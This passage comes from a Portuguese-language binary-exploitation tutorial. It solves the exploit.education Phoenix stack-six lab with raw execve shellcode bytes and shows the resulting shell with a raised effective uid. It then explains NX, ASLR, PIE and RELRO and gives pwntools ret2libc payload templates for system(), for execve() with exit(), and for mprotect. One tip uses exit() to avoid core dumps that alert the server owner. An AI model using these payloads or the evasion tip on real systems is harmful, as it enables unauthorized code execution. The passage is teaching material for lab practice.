<p>Mas por exemplo, caso executemos <code>./stack-six</code> ao invÃ©s de <code>/opt/phoenix/amd64/stack-six</code>, o exploit nÃ£o funciona :(</p>
<pre><code class="language-x86asm">$ ./stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you ï¿½AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½ï¿½ï¿½ï¿½ï¿½
Segmentation fault
</code></pre>
<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferenÃ§a Ã© causada pela env <code>LS_COLORS</code>
(uma variÃ¡vel <strong>gigantesca</strong> que lista as cores do terminal!</p>
<p>Caso vocÃª utilize um terminal mais moderno (com emojis por exemplo) para entrar via ssh, pode haver uma diferenÃ§a!</p>
<p>Mas vocÃª esta equipadx com o conhecimento para conseguir resolver e encontrar o valor correto, caso tenha mudado! :D</p>
<hr />
<p>Agora, vamos usar um shellcode de verdade! AtÃ© achar um que funciona Ã© tentativa e erro! Eu recomendo vocÃª procurar aqui: <a href="http://shell-storm.org/shellcode/">shell-storm</a></p>
<p>Para mim, <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">shellcode-806</a> costuma funcionar muito bem, e dessa vez funcionou perfeitamente! :D</p>
<p>Mas claro, vocÃª pode brincar com todos aqueles shellcodes: alterar a senha, criar um arquivo, ... o ceu Ã© o limite! Ou talvez nem o ceu... ja que esse esse Ã© um tutorial sobre quebrar limites hehehe :D</p>
<blockquote>
<p>AVISO: Esse tutorial Ã© sobre quebrar o limite de buffers! NÃ£o tente quebrar o ceu, pois pode resultar em acidentes, quedas, ou as pessoas rirem de vocÃª socando o ar!</p>
</blockquote>
<p>Mas bem, piadas sem graÃ§a a parte, o exploit ficou assim: SHELLCODE+99 * A+c0</p>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1ï¿½Hï¿½Ñï¿½ï¿½ĞŒï¿½ï¿½Hï¿½ï¿½ST_ï¿½RWT^ï¿½;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½ï¿½ï¿½ï¿½ï¿½
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que Ã© a mesma hehe :D</p>
<p>Ou caso vocÃª prefira tudo em um sÃ³ comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<p>Lembrando que a quantidade de As deve ser alterada para que <code>c0 seja o byte 127 (shellcode + AAAAAA + c0 = 127)</code></p>
<p>Nesse caso, o shellcode tem 27 bytes: <code>27 + 99 As + 1 byte (c0) = 127</code></p>
<p>Caso seu shellcode seja maior, basta reduzir os As respectivamente!</p>
<hr />
<p>Finalmente! terminamos a parte da stack uhuuu</p>
<p>Esse stack-six foi beeeeem complicadinho! EntÃ£o parabÃ©ns por ter chegado ate aqui! :D</p>
<a class="header" href="print.html#-soluÃ§Ã£o-6" id="-soluÃ§Ã£o-6"><h1>ğŸ’« SoluÃ§Ã£o</h1></a>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1ï¿½Hï¿½Ñï¿½ï¿½ĞŒï¿½ï¿½Hï¿½ï¿½ST_ï¿½RWT^ï¿½;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½ï¿½ï¿½ï¿½ï¿½
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que Ã© a mesma hehe :D</p>
<p>Ou caso vocÃª prefira tudo em um sÃ³ comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<ul>
<li><a href="print.html#dep--nx--wx">DEP | NX | W^X</a></li>
<li><a href="print.html#system-aslr">System ASLR</a></li>
<li><a href="print.html#pie">PIE</a></li>
<li><a href="print.html#relro">RELRO</a>
<ul>
<li><a href="print.html#parcial">Parcial</a></li>
<li><a href="print.html#full">Full</a></li>
<li><a href="print.html#fontes-e-recursos-adicionais">Fontes e Recursos Adicionais</a></li>
</ul>
</li>
<li><a href="print.html#canaries">Canaries</a></li>
<li><a href="print.html#outras">Outras</a>
<ul>
<li><a href="print.html#linux">Linux</a>
<ul>
<li><a href="print.html#pointer-guard">Pointer Guard</a></li>
</ul>
</li>
<li><a href="print.html#windows">Windows</a></li>
</ul>
</li>
</ul>
<a class="header" href="print.html#dep--nx--wx" id="dep--nx--wx"><h1>DEP | NX | W^X</h1></a>
<p>Todas essas pretendem impedir a execuÃ§Ã£o de cÃ³digo em
partes da memoria que sejam &quot;escreviveis&quot;.</p>
<p>Impedir que x atacante execute o cÃ³digo escrito
pelx mesmx, previne que Shellcodes sejam usados! :D</p>
<p>Assim, ou uma parte da memoria ou pode ser escrita, ou
executÃ¡vel, mas nunca as duas simultaneamente:
<strong>W</strong>rite <strong>XOR(^)</strong> e<strong>X</strong>ecute</p>
<p>VocÃª vai ouvir pessoas usando os 3 nomes para representar
esse conceito, e dependendo do contexto nÃ£o tem problema!</p>
<p>Porem eles sÃ£o tecnicamente diferentes:</p>
<p><strong>DEP</strong> (<strong>P</strong>revencao da <strong>E</strong>xecucao de <strong>D</strong>ados):
a implementaÃ§Ã£o do <strong>Windows</strong></p>
<p><strong>N</strong>ao e<strong>X</strong>ecute: um bit que pode ser colocado para
garantir a exclusÃ£o mutua em processadores <strong>AMD</strong>.</p>
<p>Intel tem um outro nome, que eu nÃ£o lembro...
e nÃ£o importa o suficiente para eu pesquisar! :P</p>
<blockquote>
<p>Atualmente, a exclusÃ£o mutua de escrever e executar
ocorre por meio de paging: o sistema operacional decide
as permissÃµes das paginas de memorias, e garante que uma
nÃ£o viole W^X . <strong>No momento que vocÃª esta lendo, isso
pode ter mudado!</strong></p>
</blockquote>
<a class="header" href="print.html#system-aslr" id="system-aslr"><h1>System ASLR</h1></a>
<p>ASLR randomiza os endereÃ§os das coisas na memoria! Porem
com as suas limitaÃ§Ãµes, dado que depende doo sistema
operacional!</p>
<p>Cada OS implementa de um jeito, mas em geral se randomiza:</p>
<ul>
<li>Imports dinamicos (LIBC,...)</li>
<li>Segmentos do executÃ¡vel (Data, ROData, ...)</li>
<li>Stack e Heap</li>
</ul>
<p><strong>Porem, o endereÃ§o do cÃ³digo nÃ£o muda!</strong></p>
<a class="header" href="print.html#pie" id="pie"><h1>PIE</h1></a>
<p>Para garantir que o cÃ³digo tambÃ©m tenha sua posiÃ§Ã£o
randomizada, o binÃ¡rio precisa ser compilado com PIE !</p>
<p>PIE (<strong>E</strong>xecucao <strong>I</strong>ndependente da <strong>P</strong>osiÃ§Ã£o) impede
que o codigo possa ser executado independente da sua<br />
posiÃ§Ã£o na memoria (duh :P)</p>
<p>Para garantir isso, todos endereÃ§os precisam ser relativos ao invÃ©s de absolutos!</p>
<pre><code>            EndereÃ§o	InstruÃ§Ã£o
Sem PIE     0x0001	jmp 0x0003 &lt;- EIP	
            0x0002	add 1 2
            0x0003	add 1 3

Com PIE     ------	jmp EIP+2  &lt;- EIP
            ------	add 1 2
            ------	add 1 3
</code></pre>
<p>No primeiro caso, se o executÃ¡vel mudar de endereÃ§o
o <code>JMP</code> pularia para a instruÃ§Ã£o errada, por causa do
endereÃ§o absoluto.</p>
<a class="header" href="print.html#relro" id="relro"><h1>RELRO</h1></a>
<p>Realocacoes Read-only: Dividido em 2 tipos: Parcial e Full</p>
<p>Atualmente, somente o RELRO Parcial vem como padrao no gcc</p>
<ul>
<li>PARCIAL: <code>gcc -Wl,-z,relro</code> ou nenhuma flag, em versoes modernas</li>
<li>FULL: <code>gcc -Wl,-z,relro,-z,now</code></li>
</ul>
<a class="header" href="print.html#parcial" id="parcial"><h2>Parcial</h2></a>
<ul>
<li>As <code>sections</code> de dados do ELF (<code>got</code>,<code>dtors</code>,<code>ctors</code>) precedem as do programa
(<code>data</code>,<code>bss</code>). Assim, caso tenha um BoF no programa a estrutura do ELF fica
intacta.</li>
</ul>
<a class="header" href="print.html#full" id="full"><h2>Full</h2></a>
<ul>
<li>Tudo do parcial</li>
<li>Re-Mapeia a GOT como <code>r--</code>, impedindo que a usemos para ganhar execucao.</li>
</ul>
<p>Porem para fazer isso torna-se nescessario pre-resolver todas as calls
dinamicas. Assim. desativando <code>RTLD_LAZY</code> e consequentemente tornando a
inicializacao mais lenta.</p>
<p>Da nossa perspectiva, ficamos com opcoes reduzidas para execucao de codigo,
tendo de usar tecnicas como corromper os <code>malloc hooks</code> ou o <code>vtable</code> pointer
do <code>stdio</code>. (mais sobre esses no futuro!)</p>
<a class="header" href="print.html#fontes-e-recursos-adicionais" id="fontes-e-recursos-adicionais"><h2>Fontes e Recursos Adicionais</h2></a>
<ul>
<li><a href="https://www.trapkit.de/articles/relro/">trapkit: RELRO A (not so well known) Exploit Mitigation Technique</a></li>
<li><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/em386/Self-Protecting-GOT.html">Self Protecting GOT</a></li>
</ul>
<hr />
<p>TODO</p>
<hr />
<a class="header" href="print.html#canaries" id="canaries"><h1>Canaries</h1></a>
<a class="header" href="print.html#outras" id="outras"><h1>Outras</h1></a>
<a class="header" href="print.html#linux" id="linux"><h2>Linux</h2></a>
<a class="header" href="print.html#pointer-guard" id="pointer-guard"><h3>Pointer Guard</h3></a>
<a class="header" href="print.html#windows" id="windows"><h2>Windows</h2></a>
<ul>
<li><a href="print.html#ret2libc">Ret2LibC</a></li>
<li><a href="print.html#fun%C3%A7%C3%B5es-%C3%BAteis">FunÃ§Ãµes Ãšteis</a>
<ul>
<li><a href="print.html#system">System()</a>
<ul>
<li><a href="print.html#conseguindo-o-pointer-para-binsh">Conseguindo o pointer para /bin/sh</a></li>
<li><a href="print.html#layout-da-stack-numa-call-32-bits">Layout da stack numa call 32 bits</a></li>
<li><a href="print.html#unindo-tudo">Unindo tudo</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#pontos-fracos">Pontos Fracos</a>
<ul>
<li><a href="print.html#estaticamente-linkado">Estaticamente Linkado</a></li>
<li><a href="print.html#dinamicamente-linkado--aslr">Dinamicamente Linkado (+ ASLR)</a></li>
</ul>
</li>
<li><a href="print.html#fun%C3%A7%C3%B5es-uteis-pt-2">FunÃ§Ãµes Uteis Pt 2</a>
<ul>
<li><a href="print.html#execve--exit">Execve() + Exit()</a></li>
<li><a href="print.html#mprotect--ret2shellcode">Mprotect() + ret2shellcode</a>
<ul>
<li><a href="print.html#argumentos">Argumentos</a>
<ul>
<li><a href="print.html#addr">Addr</a></li>
<li><a href="print.html#size">Size</a></li>
<li><a href="print.html#perms">Perms</a></li>
</ul>
</li>
<li><a href="print.html#classifica%C3%A7%C3%A3o">ClassificaÃ§Ã£o</a></li>
<li><a href="print.html#analise">Analise</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<a class="header" href="print.html#ret2libc" id="ret2libc"><h1>Ret2LibC</h1></a>
<p>Ret2Libc foi uma tÃ©cnica desenvolvida para combater W^X. Alem disso,
ter domÃ­nio dessa tÃ©cnica facilitar a compreensÃ£o de ROP. :D</p>
<p>Por nao podermos colocar o shellcode na stack (ou heap), precisamos
encontrar outra maneira de conseguir uma shell... Assim, vamos precisar
encontrar uma parte executÃ¡vel na memoria! Uma funÃ§Ã£o do prÃ³prio programa!</p>
<p>Voce se lembra de quando chamÃ¡vamos uma <code>call_me()</code> ou <code>win()</code> nos desafios
iniciais? EntÃ£o... poderÃ­amos fazer isso... mas ninguÃ©m colocaria uma
funÃ§Ã£o pre-pronta pra nos dar uma shell :(</p>
<p>Felizmente, existe LibC, e dentro dela existem mÃºltiplas funÃ§Ãµes Ãºteis!</p>
<a class="header" href="print.html#funÃ§Ãµes-Ãšteis" id="funÃ§Ãµes-Ãšteis"><h1>FunÃ§Ãµes Ãšteis</h1></a>
<a class="header" href="print.html#system" id="system"><h2>System()</h2></a>
<p><a href="https://godbolt.org/z/691asM">Compiler Explorer: System</a></p>
<p>Para nosso propÃ³sito, ela recebe 1 argumento, o caminho do programa para
executar (Ex: <code>/bin/sh</code>)</p>
<p>Em C:</p>
<pre><code class="language-C">#include &lt;stdlib.h&gt;
int main() {
    system(&quot;/bin/ls&quot;);
    return 0;
}
</code></pre>
<p>Em assembly:</p>
<pre><code class="language-x86asm">.LC0:
        .string &quot;/bin/ls&quot;
main:
        push    rbp
        mov     rbp, rsp
        mov     edi, OFFSET FLAT:.LC0
        call    System
        mov     eax, 0
        pop     rbp
        ret
</code></pre>
<p>A funÃ§Ã£o recebe um pointer para a string via <code>rdi</code> (64 bits) ou os
argumentos sao passados pela stack (32 bits). Nesse post vou focar em 32
bits!</p>
<a class="header" href="print.html#conseguindo-o-pointer-para-binsh" id="conseguindo-o-pointer-para-binsh"><h4>Conseguindo o pointer para /bin/sh</h4></a>
<p>Usando pwntools:</p>
<pre><code class="language-python">x = next(libc.search(b&quot;/bin/sh\x00&quot;))
</code></pre>
<p>x sera um pointer contendo o endereÃ§o da string <code>/bin/sh</code></p>
<p>Em 32 bits, basta colocar ele no local previamente mencionado!</p>
<p>Em 64 bits, precisaremos de um gadget para colocar esse valor no rdi...
Portanto, voce vai precisar saber ROP, o tema do proximo capitulo!</p>
<a class="header" href="print.html#layout-da-stack-numa-call-32-bits" id="layout-da-stack-numa-call-32-bits"><h4>Layout da stack numa call 32 bits</h4></a>
<pre><code class="language-x86asm">    Func_1
 ____________
|            |
|    RBP     | 
|____________| 
 ____________
|            |
|    RIP     | &lt;--- RSP -&gt; No BOF tradicional, corrompemos esse RIP!
|____________|      Porem, nao costumamos pensar o que acontece depois!
 ____________
|            |      Um ret simplesmente significa:
|   ARG_1    |         pop RIP
|____________|         jmp RIP
 ____________           
|            |      E como em qualquer pop, RSP se movimenta
|   ARG_2    |
|____________| 

    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
|    RBP     |   Vamos supor que RIP-&gt;System()     |            |
|____________|   EntÃ£o da perspectiva de System,   |____________|
 ____________           ARG_1 vira RIP              ____________       
|            |          ARG_2 vira ARG_1           |            |
|    RIP     |   ____                              |            |
|____________|       |                             |____________|
 ____________        |                              ____________
|            |       V                             |            |  
|   ARG_1    | &lt;--- RSP                   RSP ---&gt; |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|   ARG_2    |                                     |   ARG_1    |
|____________|                                     |____________|


    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
| AAAAAAAAAA |    A Func_1 esta vulnerÃ¡vel a BOF   |            |
|____________|                                     |____________|
 ____________                                       ____________       
|            |    E nos controlamos a stack :D     |            |
|  SYSTEM()  |    EntÃ£o podemos passar os args     |            |
|____________|    e o RIP de retorno para System   |____________|
 ____________                                       ____________
|            |                                     |            |  
|  DDDDDDD   | &lt;--- RSP                   RSP ---&gt; |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|  /bin/sh   | &lt;&lt;&lt; --------------------------- &gt;&gt;&gt; |   ARG_1    |
|____________|                                     |____________|

                  System (ou qualquer outra 
                  funÃ§Ã£o que voce chamar) 
                  vai executar /bin/sh e 
                  tentar retornar para DDDDDDDD

</code></pre>
<p>Ao tentar retornar para <code>DDDDDDDD</code>, ocorrera uma <code>SEGFAULT</code>.</p>
<p>Isso sera discutido na proxima secao (<code>Execve</code>)....</p>
<p>Mas por enquanto, o que voce precisa saber: <code>System</code> cria um novo processo
(<code>fork</code>, gerando um processo secundÃ¡rio: <code>child_proc</code>)!</p>
<p>EntÃ£o retornar errado vai crashar o <code>child_proc</code> ... mas e esse crash sera
reportado para o processo principal e nao para o computador!</p>
<blockquote>
<p><code>System</code> AGE COMO UMA EXCESSAO: NAO GERANDO <code>SEGFAULT</code> AO RETORNAR ERRADO !!!!!</p>
</blockquote>
<a class="header" href="print.html#unindo-tudo" id="unindo-tudo"><h3>Unindo tudo</h3></a>
<p>Vamos supor que o programa esta vulnerÃ¡vel a um BoF tradicional na funÃ§Ã£o
<code>batata()</code>, possui W^X, e o ASLR esta DESATIVADO!</p>
<p>O <code>RIP</code> salvo esta a 40 bytes de distancia!</p>
<pre><code class="language-python">from pwn import *

elf = ELF(&quot;./blablabla&quot;)
libc = elf.libc

payload = b&quot;&quot;
payload += b&quot;A&quot; * 40            # Padding
payload += p32(libc.sym.system) # RIP salvo batata()
payload += b&quot;D&quot; * 8             # Padding / RIP salvo system()
payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 para system()
</code></pre>
<p>Caso voce esteja com pressa, adios!</p>
<p>Daqui em diante eu vou discutir tÃ©cnicas alternativas de ret2libc, vantagens
e desvantagens... Para ter bom proveito eu recomendo re-ler depois de aprender
ROP!</p>
<a class="header" href="print.html#pontos-fracos" id="pontos-fracos"><h1>Pontos Fracos</h1></a>
<a class="header" href="print.html#estaticamente-linkado" id="estaticamente-linkado"><h2>Estaticamente Linkado</h2></a>
<p>Em programas estaticamente linkados ao libc, somente podemos usar uma
fraÃ§Ã£o das funÃ§Ãµes presentes, pois somente as que sao originalmente usadas
pelo programa sao linkadas!</p>
<a class="header" href="print.html#dinamicamente-linkado--aslr" id="dinamicamente-linkado--aslr"><h2>Dinamicamente Linkado (+ ASLR)</h2></a>
<p>Ja em programas que usam o libc do sistema, voce pode usar o todo o
potencial do libc. Porem caso o computador possua ASLR ligado, sera
necessÃ¡rio primeiro encontrar o endereÃ§o aleatÃ³rio do libc (libc-leak), ou
executar o exploit em loop ate voce dar sorte (viÃ¡vel somente em
computadores 32 bits).</p>
<a class="header" href="print.html#funÃ§Ãµes-uteis-pt-2" id="funÃ§Ãµes-uteis-pt-2"><h1>FunÃ§Ãµes Uteis Pt 2</h1></a>
<a class="header" href="print.html#execve--exit" id="execve--exit"><h2>Execve() + Exit()</h2></a>
<p><a href="https://godbolt.org/z/7c6xWd">Compiler Explorer: System</a></p>
<p><code>Execve</code> e simplesmente um wrapper envolta da syscall de mesmo nome, e
funciona igual <code>System</code>, porem com uma diferenÃ§a: <code>System</code> cria um novo
processo para o programa, enquanto <code>Execve</code> substitui o atual!</p>
<p>Quando vc sai da shell em <code>System</code>, o programa finaliza normalmente. Ja em
<code>Execve</code>, ele age como se estivesse retornando de uma <code>call</code>, assim, se voce
simplesmente chamar ele, quando voce fechar a shell vai gerar uma
<code>SEGFAULT</code> tentando executar <code>*DDDDDDD</code></p>
<p>E com a <code>SEGFAULT</code>, um core dump sera gerado... Disparando alarmes e
ativando mecanismos de seguranÃ§a que alertam o dono do servidor!</p>
<p>Assim, precisamos substituir esse valor por <code>Exit()</code>, garantindo que o
programa finalize silenciosamente!</p>
<p>Alem disso, existe mais uma diferenÃ§a, <code>execve</code> recebe 3 argumentos:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  execve(&quot;./blablabla&quot;, NULL, NULL);
  return 1;
}
</code></pre>
<p>O primeiro: programa a ser executado</p>
<p>O segundo: argv (poderÃ­amos passar <code>-p</code> para <code>sh</code> manter os privilÃ©gios)</p>
<p>O terceiro: envp (environment vars)</p>
<p>Nos podemos simplesmente defini-las como <code>NULL</code> para evitar dor de cabeca!</p>
<p>Em 64 bits precisarÃ­amos de mÃºltiplos gadgets para salvar um em cada register</p>
<pre><code class="language-x86asm">.LC0:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        mov     edx, 0                ; envp
        mov     esi, 0                ; argv
        mov     edi, OFFSET FLAT:.LC0 ; programa
        call    execve
        mov     eax, 1
        pop     rbp
        ret
</code></pre>
<p>Caso voce queira usar argv:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
  execve(&quot;./blablabla&quot;, argv, NULL);
  return 1;
}
</code></pre>
<pre><code class="language-x86asm">.LC0:
        .string &quot;arg1&quot;
.LC1:
        .string &quot;arg2&quot;
.LC2:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 32
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        lea     rax, [rbp-32]
        mov     edx, 0
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC2
        call    execve
        mov     eax, 1
        leave
        ret
</code></pre>
<p>E combinando tudo: <a href="https://godbolt.org/z/45dsKr">Compiler Explorer</a></p>
<p>Vai testar la, pra voce criar uma vibe intuitiva do que ta acontecendo!</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
  char *envp[] = {&quot;env1&quot;, &quot;env2&quot;, NULL};
  execve(&quot;./blablabla&quot;, argv, envp);
  return 1;
}}
</code></pre>
<pre><code class="language-x86asm">..LC0:
        .string &quot;arg1&quot;
.LC1:
        .string &quot;arg2&quot;
.LC2:
        .string &quot;env1&quot;
.LC3:
        .string &quot;env2&quot;
.LC4:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 64
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        mov     QWORD PTR [rbp-64], OFFSET FLAT:.LC2
        mov     QWORD PTR [rbp-56], OFFSET FLAT:.LC3
        mov     QWORD PTR [rbp-48], 0
        lea     rdx, [rbp-64]
        lea     rax, [rbp-32]
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC4
        call    execve
        mov     eax, 1
        leave
        ret
</code></pre>
<p>Bem, agora que voce voltou de ficar brincando com a funÃ§Ã£o, vamos voltar a pratica:</p>
<p>Eu tenho 99% de certeza que isso funcionaria, porem eu nunca usei execve em 32 bits! D:</p>
<pre><code class="language-python">from pwn import *

elf = ELF(&quot;./blablabla&quot;)
libc = elf.libc

payload = b&quot;&quot;
payload += b&quot;A&quot; * 40                              # Padding
payload += p32(libc.sym.execve)                   # RIP salvo batata()
payload += p32(libc.sym.exit)                     # RIP salvo execve()
payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 execve()
payload += p32(0)                                 # argv execve()
payload += p32(0)                                 # envp execve()
</code></pre>
<p>Os argumentos estÃ£o sendo passados conforme convenÃ§Ã£o... mas eu nao posso garantir!</p>
<p>Tecnicamente eu poderia testar usando a referencia acima (<code>[rbp - 123]</code>) ! opa, preguiÃ§a hehehe :/</p>
<blockquote>
<p>Mas como eu mencionei anteriormente, <code>execve</code> e a proxima tÃ©cnica (<code>mprotect</code>)
sao mais comuns apos voce aprender ROP, apesar de tecnicamente serem ret2libc</p>
</blockquote>
<a class="header" href="print.html#mprotect--ret2shellcode" id="mprotect--ret2shellcode"><h2>Mprotect() + ret2shellcode</h2></a>
<p><code>Mprotect</code> pode ser usado para tornar uma regiÃ£o da memoria <code>RWX</code> novamente!</p>
<p>A funcao recebe 3 argumentos: mprotect(addr, size, perms)</p>
<p>Assim, em 64 bits vamos precisar de uma chain, e em 32 bits dar push da
direita pra esquerda!</p>
<pre><code>mprotect
ret       -&gt; shellcode
addr
size
perms
</code></pre>
<a class="header" href="print.html#argumentos" id="argumentos"><h3>Argumentos</h3></a>
<a class="header" href="print.html#addr" id="addr"><h4>Addr</h4></a>
<p>O endereÃ§o deve ser alinhado ao page_size, assim podemos fazer:</p>
<pre><code class="language-py">((addr &gt;&gt; 4*n) &lt;&lt; 4*n)
</code></pre>
<p>Alinhando o endereÃ§o fazendo shift-direita shift-esquerda, 4 por digito hex!</p>
<pre><code class="language-py">&gt;&gt;&gt; hex((0x7ffe23668bf4 &gt;&gt; 12) &lt;&lt; 12 )
'0x7ffe23668000'
</code></pre>
<a class="header" href="print.html#size" id="size"><h4>Size</h4></a>
<p>O valor deve ser multiplo de page_size, exemplo:
0x1000 em x86_64</p>
<p>Para encontrar esse valor na arquitetura que voce esta usando, basta ler o
manual (opÃ§Ã£o chata e 0% descolada) ou usar <code>page_size = getpagesize ();</code> em C</p>
<a class="header" href="print.html#perms" id="perms"><h4>Perms</h4></a>
<p>As permissÃµes sao: <code>PERM_READ, PERM_WRITE,... etcetc</code></p>
<blockquote>
<p>OBS: existem outras permissÃµes relacionadas a memoria privada vs compartilhada etc</p>
</blockquote>
<p>Porem, essas sao somente macros de valor substituÃ­das por <code>ints</code></p>
<blockquote>
<p>read=1 write=2 exec=4</p>
</blockquote>
<p>Assim, para termos todas as permissÃµes, o valor de perms deve ser <code>7</code>!</p>
<a class="header" href="print.html#classificaÃ§Ã£o" id="classificaÃ§Ã£o"><h3>ClassificaÃ§Ã£o</h3></a>
<p>Esses tipo de exploit se classifica como: exploit de mÃºltiplas etapas</p>
<p>Assim, tornando a regiÃ£o do nosso shellcode executÃ¡vel, e somente depois
pulando para ele!
Esses exploits vem se tornando mais e mais comuns conforme novas proteÃ§Ãµes
sao adicionadas!</p>
<a class="header" href="print.html#analise" id="analise"><h3>Analise</h3></a>
<p>Porem, essa tÃ©cnica sera usada predominantemente em SROP 64 bits !</p>
<p>Caso voce nao esteja vendo SROP no momento, pode pular e voltar no futuro!</p>
<p>Eu recomendo que voce pegue o exemplo em <code>man mprotect</code> e brinque com ele +
<code>strace --trace=mprotect</code> para criar uma intuiÃ§Ã£o!</p>
<p>Eu alterei o meu para ficar assim:</p>
<pre><code class="language-C">#include &lt;fcntl.h&gt;
#include &lt;signal.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

static int alloc_size;
static char* memory;

// gcc c.c -o c

void segv_handler (int signal_number) 
{
 printf (&quot;memory accessed!\n&quot;);
 mprotect (memory, alloc_size, PROT_READ | PROT_WRITE);
} 

void foo() {
 mprotect (memory, alloc_size, 2);
}

int main ()
{
 int fd;
 struct sigaction sa;

 /* Install segv_handler as the handler for SIGSEGV. */
 memset (&amp;sa, 0, sizeof (sa));
 sa.sa_handler = &amp;segv_handler;
 sigaction (SIGSEGV, &amp;sa, NULL);
 
 /* Allocate one page of memory by mapping /dev/zero. Map the memory
   as write-only, initially. */
 alloc_size = getpagesize ();
 fd = open (&quot;/dev/zero&quot;, O_RDONLY);
 memory = mmap (NULL, alloc_size, PROT_WRITE, MAP_PRIVATE, fd, 0);
 close (fd);

 /* Write to the page to obtain a private copy. */
 memory[0] = 0;

 foo();


 /* Write to the allocated memory region. */
 memory[0] = 1;

 /* All done; unmap the memory. */
 printf (&quot;all done\n&quot;);
 munmap (memory, alloc_size);
 return 0;
}
</code></pre>
<p>Eu coloquei a funcao dentro do <code>foo()</code>, caso o gcc esteja colocando ela inline,
vale a pena checar as flags de otimizaÃ§Ã£o!</p>
<p>A funcao fica:</p>
<pre><code class="language-x86asm">   0x00005555555552a7 &lt;+0&gt;:	endbr64 
   0x00005555555552ab &lt;+4&gt;:	push   rbp
   0x00005555555552ac &lt;+5&gt;:	mov    rbp,rsp
   0x00005555555552af &lt;+8&gt;:	mov    eax,DWORD PTR [rip+0x2d63]  # alloc_size
   
b  0x00005555555552b5 &lt;+14&gt;:	movsxd rcx,eax
   
b  0x00005555555552b8 &lt;+17&gt;:	mov    rax,QWORD PTR [rip+0x2d61]  # memory

b  0x00005555555552bf &lt;+24&gt;:	mov    edx,0x2

